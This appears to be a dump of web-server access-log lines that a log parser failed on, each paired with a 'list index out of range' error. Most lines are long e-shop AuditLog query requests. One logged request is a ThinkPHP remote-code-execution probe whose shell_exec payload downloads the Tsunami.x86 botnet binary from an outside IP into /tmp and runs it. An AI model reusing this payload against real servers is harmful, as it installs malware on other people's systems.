%201157579,%201186837,%201191838,%201195750,%201195818,%201197113,%201197191,%201199573,%201199678,%201201149,%201205467,%201205608,%201209127,%201212284,%201216428,%201217613,%201220302,%201227115,%201227567,%201227648,%201230546,%201230626,%201230706,%201231884,%201232727,%201235727,%201239598,%201244187,%201250216,%201253251,%201255770,%201258721,%201261083,%201269483,%201271605,%201281958,%201281966,%201284379,%201284387,%201285874,%201286328,%201297335,%201297428,%201297490,%201297578,%201300615,%201301457,%201305438,%201314326,%201325873,%201334356,%201334493,%201334727,%201337865,%201340881,%201354443,%201366687,%201367181,%201395029,%201395662,%201421567,%201432686,%201451799,%201470886,%201471381,%201496579,%201529072,%201539472,%201548771,%201556975,%201557022,%201566843,%201579051,%201595982,%201597683,%201601114,%201601151,%201602204,%201610912,%201628258,%201645573,%201652853,%201664621,%201675380,%201688191,%201709363,%201713474,%201763500,%201780190,%201786017,%201797426,%201802306,%201809760,%201849745,%201853088,%201857899,%201865494,%201873204,%201884296,%201901454,%201907621,%201919817,%201931657,%201932158,%201955188,%201965159,%201282274,%201285875,%201297336,%201297429,%201297492,%201297579,%201300616,%201301458,%201305439,%201314327,%201336662,%201336706,%201337866,%201338818,%201350826,%201354444,%201366689,%201367183,%201395031,%201395664,%201421569,%201432688,%201451801,%201470888,%201471383,%201496581,%201529074,%201539474,%201548773,%201556977,%201557024,%201566845,%201579053,%201592650,%201593173,%201593329,%201595984,%201597685,%201601116,%201601153,%201602206,%201610914,%201628260,%201645575,%201652855,%201664623,%201675382,%201688193,%201709365,%201713476,%201744326,%201744366,%201746850,%201746867,%201746884,%201755658,%201759624,%201763502,%201780192,%201786019,%201802308,%201809762,%201821473,%201833376,%201838726,%201842687,%201844941,%201849747,%201853090,%201857901,%201866924,%201897797,%201897834,%201901603,%201901682,%201901762,%201901" 414 186 "-" "-" "-"\n', 'list index out of range')
('5.117.116.238 - - [23/Jan/2019:09:31:13 +0330] "GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:247},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[655]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[1647,%2058783]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[20267,%2028028,%2032913,%2050600,%2060018,%2075651,%2097600,%20104145,%20116307,%20119634,%20120021,%20121368,%20133668,%20171205,%20184500,%20211667,%20231402,%20239281,%20243773,%20293998,%20307392,%20311228,%20324795,%20349049,%20361268,%20363747,%20381586,%20435380,%20435662,%20437128,%20437444,%20437726,%20461117,%20478700,%20568838,%20596275,%20636543,%20693203,%20695024,%20781375,%20782140,%201052862,%201056338,%201060138,%201060297,%201062813,%201063084,%201065201,%201065223,%201067894,%201070052,%201070751,%201074717,%201077799,%201081773,%201082094,%201082120,%201082146,%201083853,%201083880,%201090330,%201090849,%201091808,%201091868,%201091891,%201097260,%201098059,%201098084,%201099081,%201099455,%201101088,%201102656,%201103360,%201103796,%201103974,%201104076,%201104146,%201104179,%201104674,%201105288,%201109520,%201111611,%201118768,%201122867,%201124485,%201129387,%201132112,%201135981,%201135990,%201141252,%201141681,%201152585,%201157244,%201185071,%201186076,%201192363,%201196827,%201196838,%201198371,%201198475,%201201615,%201202495,%201205934,%201211527,%201211874,%201213091,%201216191,%201218903,%201219263,%201221659,%201226667,%201231955,%201236694,%201248311,%201255181,%201269633,%201272922,%201281074,%201281437,%201285407,%201286956,%201290806,%201293056,%201299222,%201305782,%201309655,%201324754,%201325222,%201336319,%201336640,%201339820,%201340973,%201355115,%201355411,%201358787,%201359282,%201373205,%201373845,%201374319,%201380112,%201391226,%201401012,%201401445,%201404173,%201404174,%201407035,%201407036,%201407123,%201407124,%201407210,%201407294,%201407377,%201407455,%201422790,%201423677,%201424244,%201424812,%201425380,%201425813,%201427651,%201428146,%201428566,%201429000,%201452356,%201452780,%201457257,%201457398,%201457998,%201478279,%201509674,%201512033,%201515807,%201531480,%201541488,%201550470,%201550907,%201551595,%201551672,%201551963,%201566195,%201567129,%201577808,%201591994,%201610269,%201612040,%201615378,%201615419,%201619857,%201633768,%201653187,%201658274,%201658280,%201658283,%201662737,%201679910,%201679957,%201681939,%201686637,%201701176,%201713106,%201746894,%201755738,%201762457,%201763068,%201771420,%201779494,%201785207,%201792944,%201797260,%201797268,%201797348,%201799197,%201802624,%201804453,%201806902,%201812068,%201816857,%201830995,%201835850,%201842395,%201848154,%201851428,%201851674,%201856366,%201856700,%201862895,%201862994,%201863208,%201864546,%201867539,%201870489,%201870684,%201873018,%201882018,%201883315,%201885948,%201892480,%201892542,%201893650,%201893674,%201894577,%201894979,%201896734,%201896785,%201896842,%201903467,%201904569,%201904984,%201905159,%201905830,%201906126,%201906545,%201907453,%201907703,%201907736,%201907769,%201907808,%201910720,%201912073,%201916623,%201916776,%201917055,%201920034,%201920722,%201922613,%201922770,%201922771,%201922951,%201928655,%201931006,%201933405,%201934199,%201934206,%201934252,%201935012,%201935133,%201939151,%201940659,%201940777,%201942212,%201942270,%201949122,%201949552,%201949982,%201954484,%201957983,%201958159,%201964281,%201966531,%201972728,%201052863,%201056339,%201060139,%201060298,%201062814,%201063085,%201065202,%201065224,%201067895,%201070053,%201070752,%201074718,%201077800,%201081774,%201082095,%201082121,%201082147,%201083854,%201083881,%201090331,%201090850,%201091809,%201091869,%201091892,%201097261,%201098060,%201098085,%201099082,%201099456,%201101089,%201102657,%201103361,%201103797,%201104077,%201104147,%201104180,%201104675,%201105289,%201109521,%201111612,%201118769,%201122868,%201124486,%201129388,%201132113,%201135982,%201135991,%201141253,%201141682,%201152586,%201157245,%201185072,%201186077,%201192364,%201202496,%201205935,%201211528,%201211875,%201213092,%201216192,%201218904,%201219264,%201221660,%201226668,%201231956,%201236695,%201248312,%201255182,%201269634,%201272923,%201281075,%201281438,%201285408,%201286957,%201290807,%201293057,%201299223,%201305783,%201309656,%201325223,%201336320,%201336325,%201339821,%201339832,%201355116,%201355412,%201358788,%201359283,%201373207,%201373847,%201374321,%201380114,%201391228,%201401014,%201401447,%201404175,%201404176,%201407037,%201407038,%201407125,%201407126,%201407212,%201407296,%201407379,%201407457,%201422792,%201423679,%201424246,%201424814,%201425382,%201425815,%201427653,%201428148,%201428568,%201429002,%201452358,%201452782,%201457259,%201457400,%201458000,%201478281,%201531482,%201541490,%201550472,%201550909,%201551597,%201551674,%201551967,%201566197,%201567131,%201577810,%201591996,%201610271,%201612042,%201615380,%201615421,%201619859,%201633770,%201653189,%201658276,%201658282,%201658285,%201662739,%201679912,%201679959,%201681941,%201686649,%201701178,%201713108,%201746896,%201755740,%201762459,%201763072,%201771422,%201779496,%201785213,%201792946,%201797262,%201797270,%201797350,%201799199,%201802626,%201804455,%201806904,%201812070,%201816859,%201830997,%201835852,%201842397,%201848156,%201851430,%201851676,%201856368,%201856702,%201862897,%201862996,%201863210,%201864548,%201867541,%201870491,%201870686,%201873020,%201882020,%201883317,%201885950,%201892482,%201892544,%201893652,%201893680,%201894579,%201894981,%201896736,%201896787,%201896844,%201903469,%201904571,%201904986,%201905161,%201905832,%201906128,%201906547,%201907455,%201907705,%201907738,%201907771,%201907810,%201910722,%201912075,%201916625,%201916778,%201917057,%201920" 414 186 "-" "-" "-"\n', 'list index out of range')
('5.117.116.238 - - [23/Jan/2019:09:35:55 +0330] "GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:247},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[655]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[1647,%2058783]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[20267,%2028028,%2032913,%2050600,%2060018,%2075651,%2097600,%20104145,%20116307,%20119634,%20120021,%20121368,%20133668,%20171205,%20184500,%20211667,%20231402,%20239281,%20243773,%20293998,%20307392,%20311228,%20324795,%20349049,%20361268,%20363747,%20381586,%20435380,%20435662,%20437128,%20437444,%20437726,%20461117,%20478700,%20568838,%20596275,%20636543,%20693203,%20695024,%20781375,%20782140,%201052862,%201056338,%201060138,%201060297,%201062813,%201063084,%201065201,%201065223,%201067894,%201070052,%201070751,%201074717,%201077799,%201081773,%201082094,%201082120,%201082146,%201083853,%201083880,%201090330,%201090849,%201091808,%201091868,%201091891,%201097260,%201098059,%201098084,%201099081,%201099455,%201101088,%201102656,%201103360,%201103796,%201103974,%201104076,%201104146,%201104179,%201104674,%201105288,%201109520,%201111611,%201118768,%201122867,%201124485,%201129387,%201132112,%201135981,%201135990,%201141252,%201141681,%201152585,%201157244,%201185071,%201186076,%201192363,%201196827,%201196838,%201198371,%201198475,%201201615,%201202495,%201205934,%201211527,%201211874,%201213091,%201216191,%201218903,%201219263,%201221659,%201226667,%201231955,%201236694,%201248311,%201255181,%201269633,%201272922,%201281074,%201281437,%201285407,%201286956,%201290806,%201293056,%201299222,%201305782,%201309655,%201324754,%201325222,%201336319,%201336640,%201339820,%201340973,%201355115,%201355411,%201358787,%201359282,%201373205,%201373845,%201374319,%201380112,%201391226,%201401012,%201401445,%201404173,%201404174,%201407035,%201407036,%201407123,%201407124,%201407210,%201407294,%201407377,%201407455,%201422790,%201423677,%201424244,%201424812,%201425380,%201425813,%201427651,%201428146,%201428566,%201429000,%201452356,%201452780,%201457257,%201457398,%201457998,%201478279,%201509674,%201512033,%201515807,%201531480,%201541488,%201550470,%201550907,%201551595,%201551672,%201551963,%201566195,%201567129,%201577808,%201591994,%201610269,%201612040,%201615378,%201615419,%201619857,%201633768,%201653187,%201658274,%201658280,%201658283,%201662737,%201679910,%201679957,%201681939,%201686637,%201701176,%201713106,%201746894,%201755738,%201762457,%201763068,%201771420,%201779494,%201785207,%201792944,%201797260,%201797268,%201797348,%201799197,%201802624,%201804453,%201806902,%201812068,%201816857,%201830995,%201835850,%201842395,%201848154,%201851428,%201851674,%201856366,%201856700,%201862895,%201862994,%201863208,%201864546,%201867539,%201870489,%201870684,%201873018,%201882018,%201883315,%201885948,%201892480,%201892542,%201893650,%201893674,%201894577,%201894979,%201896734,%201896785,%201896842,%201903467,%201904569,%201904984,%201905159,%201905830,%201906126,%201906545,%201907453,%201907703,%201907736,%201907769,%201907808,%201910720,%201912073,%201916623,%201916776,%201917055,%201920034,%201920722,%201922613,%201922770,%201922771,%201922951,%201928655,%201931006,%201933405,%201934199,%201934206,%201934252,%201935012,%201935133,%201939151,%201940659,%201940777,%201942212,%201942270,%201949122,%201949552,%201949982,%201954484,%201957983,%201958159,%201964281,%201966531,%201972728,%201052863,%201056339,%201060139,%201060298,%201062814,%201063085,%201065202,%201065224,%201067895,%201070053,%201070752,%201074718,%201077800,%201081774,%201082095,%201082121,%201082147,%201083854,%201083881,%201090331,%201090850,%201091809,%201091869,%201091892,%201097261,%201098060,%201098085,%201099082,%201099456,%201101089,%201102657,%201103361,%201103797,%201104077,%201104147,%201104180,%201104675,%201105289,%201109521,%201111612,%201118769,%201122868,%201124486,%201129388,%201132113,%201135982,%201135991,%201141253,%201141682,%201152586,%201157245,%201185072,%201186077,%201192364,%201202496,%201205935,%201211528,%201211875,%201213092,%201216192,%201218904,%201219264,%201221660,%201226668,%201231956,%201236695,%201248312,%201255182,%201269634,%201272923,%201281075,%201281438,%201285408,%201286957,%201290807,%201293057,%201299223,%201305783,%201309656,%201325223,%201336320,%201336325,%201339821,%201339832,%201355116,%201355412,%201358788,%201359283,%201373207,%201373847,%201374321,%201380114,%201391228,%201401014,%201401447,%201404175,%201404176,%201407037,%201407038,%201407125,%201407126,%201407212,%201407296,%201407379,%201407457,%201422792,%201423679,%201424246,%201424814,%201425382,%201425815,%201427653,%201428148,%201428568,%201429002,%201452358,%201452782,%201457259,%201457400,%201458000,%201478281,%201531482,%201541490,%201550472,%201550909,%201551597,%201551674,%201551967,%201566197,%201567131,%201577810,%201591996,%201610271,%201612042,%201615380,%201615421,%201619859,%201633770,%201653189,%201658276,%201658282,%201658285,%201662739,%201679912,%201679959,%201681941,%201686649,%201701178,%201713108,%201746896,%201755740,%201762459,%201763072,%201771422,%201779496,%201785213,%201792946,%201797262,%201797270,%201797350,%201799199,%201802626,%201804455,%201806904,%201812070,%201816859,%201830997,%201835852,%201842397,%201848156,%201851430,%201851676,%201856368,%201856702,%201862897,%201862996,%201863210,%201864548,%201867541,%201870491,%201870686,%201873020,%201882020,%201883317,%201885950,%201892482,%201892544,%201893652,%201893680,%201894579,%201894981,%201896736,%201896787,%201896844,%201903469,%201904571,%201904986,%201905161,%201905832,%201906128,%201906547,%201907455,%201907705,%201907738,%201907771,%201907810,%201910722,%201912075,%201916625,%201916778,%201917057,%201920" 414 186 "-" "-" "-"\n', 'list index out of range')
('5.117.116.238 - - [23/Jan/2019:09:36:19 +0330] "GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:247},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[655]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[1647,%2058783]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[20267,%2028028,%2032913,%2050600,%2060018,%2075651,%2097600,%20104145,%20116307,%20119634,%20120021,%20121368,%20133668,%20171205,%20184500,%20211667,%20231402,%20239281,%20243773,%20293998,%20307392,%20311228,%20324795,%20349049,%20361268,%20363747,%20381586,%20435380,%20435662,%20437128,%20437444,%20437726,%20461117,%20478700,%20568838,%20596275,%20636543,%20693203,%20695024,%20781375,%20782140,%201052862,%201056338,%201060138,%201060297,%201062813,%201063084,%201065201,%201065223,%201067894,%201070052,%201070751,%201074717,%201077799,%201081773,%201082094,%201082120,%201082146,%201083853,%201083880,%201090330,%201090849,%201091808,%201091868,%201091891,%201097260,%201098059,%201098084,%201099081,%201099455,%201101088,%201102656,%201103360,%201103796,%201103974,%201104076,%201104146,%201104179,%201104674,%201105288,%201109520,%201111611,%201118768,%201122867,%201124485,%201129387,%201132112,%201135981,%201135990,%201141252,%201141681,%201152585,%201157244,%201185071,%201186076,%201192363,%201196827,%201196838,%201198371,%201198475,%201201615,%201202495,%201205934,%201211527,%201211874,%201213091,%201216191,%201218903,%201219263,%201221659,%201226667,%201231955,%201236694,%201248311,%201255181,%201269633,%201272922,%201281074,%201281437,%201285407,%201286956,%201290806,%201293056,%201299222,%201305782,%201309655,%201324754,%201325222,%201336319,%201336640,%201339820,%201340973,%201355115,%201355411,%201358787,%201359282,%201373205,%201373845,%201374319,%201380112,%201391226,%201401012,%201401445,%201404173,%201404174,%201407035,%201407036,%201407123,%201407124,%201407210,%201407294,%201407377,%201407455,%201422790,%201423677,%201424244,%201424812,%201425380,%201425813,%201427651,%201428146,%201428566,%201429000,%201452356,%201452780,%201457257,%201457398,%201457998,%201478279,%201509674,%201512033,%201515807,%201531480,%201541488,%201550470,%201550907,%201551595,%201551672,%201551963,%201566195,%201567129,%201577808,%201591994,%201610269,%201612040,%201615378,%201615419,%201619857,%201633768,%201653187,%201658274,%201658280,%201658283,%201662737,%201679910,%201679957,%201681939,%201686637,%201701176,%201713106,%201746894,%201755738,%201762457,%201763068,%201771420,%201779494,%201785207,%201792944,%201797260,%201797268,%201797348,%201799197,%201802624,%201804453,%201806902,%201812068,%201816857,%201830995,%201835850,%201842395,%201848154,%201851428,%201851674,%201856366,%201856700,%201862895,%201862994,%201863208,%201864546,%201867539,%201870489,%201870684,%201873018,%201882018,%201883315,%201885948,%201892480,%201892542,%201893650,%201893674,%201894577,%201894979,%201896734,%201896785,%201896842,%201903467,%201904569,%201904984,%201905159,%201905830,%201906126,%201906545,%201907453,%201907703,%201907736,%201907769,%201907808,%201910720,%201912073,%201916623,%201916776,%201917055,%201920034,%201920722,%201922613,%201922770,%201922771,%201922951,%201928655,%201931006,%201933405,%201934199,%201934206,%201934252,%201935012,%201935133,%201939151,%201940659,%201940777,%201942212,%201942270,%201949122,%201949552,%201949982,%201954484,%201957983,%201958159,%201964281,%201966531,%201972728,%201052863,%201056339,%201060139,%201060298,%201062814,%201063085,%201065202,%201065224,%201067895,%201070053,%201070752,%201074718,%201077800,%201081774,%201082095,%201082121,%201082147,%201083854,%201083881,%201090331,%201090850,%201091809,%201091869,%201091892,%201097261,%201098060,%201098085,%201099082,%201099456,%201101089,%201102657,%201103361,%201103797,%201104077,%201104147,%201104180,%201104675,%201105289,%201109521,%201111612,%201118769,%201122868,%201124486,%201129388,%201132113,%201135982,%201135991,%201141253,%201141682,%201152586,%201157245,%201185072,%201186077,%201192364,%201202496,%201205935,%201211528,%201211875,%201213092,%201216192,%201218904,%201219264,%201221660,%201226668,%201231956,%201236695,%201248312,%201255182,%201269634,%201272923,%201281075,%201281438,%201285408,%201286957,%201290807,%201293057,%201299223,%201305783,%201309656,%201325223,%201336320,%201336325,%201339821,%201339832,%201355116,%201355412,%201358788,%201359283,%201373207,%201373847,%201374321,%201380114,%201391228,%201401014,%201401447,%201404175,%201404176,%201407037,%201407038,%201407125,%201407126,%201407212,%201407296,%201407379,%201407457,%201422792,%201423679,%201424246,%201424814,%201425382,%201425815,%201427653,%201428148,%201428568,%201429002,%201452358,%201452782,%201457259,%201457400,%201458000,%201478281,%201531482,%201541490,%201550472,%201550909,%201551597,%201551674,%201551967,%201566197,%201567131,%201577810,%201591996,%201610271,%201612042,%201615380,%201615421,%201619859,%201633770,%201653189,%201658276,%201658282,%201658285,%201662739,%201679912,%201679959,%201681941,%201686649,%201701178,%201713108,%201746896,%201755740,%201762459,%201763072,%201771422,%201779496,%201785213,%201792946,%201797262,%201797270,%201797350,%201799199,%201802626,%201804455,%201806904,%201812070,%201816859,%201830997,%201835852,%201842397,%201848156,%201851430,%201851676,%201856368,%201856702,%201862897,%201862996,%201863210,%201864548,%201867541,%201870491,%201870686,%201873020,%201882020,%201883317,%201885950,%201892482,%201892544,%201893652,%201893680,%201894579,%201894981,%201896736,%201896787,%201896844,%201903469,%201904571,%201904986,%201905161,%201905832,%201906128,%201906547,%201907455,%201907705,%201907738,%201907771,%201907810,%201910722,%201912075,%201916625,%201916778,%201917057,%201920" 414 186 "-" "-" "-"\n', 'list index out of range')
('116.65.89.179 - - [23/Jan/2019:09:38:23 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('91.99.30.32 - - [23/Jan/2019:09:45:24 +0330] "GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:9103},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[23228,%2061448,%2061449,%2061450,%2061461]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%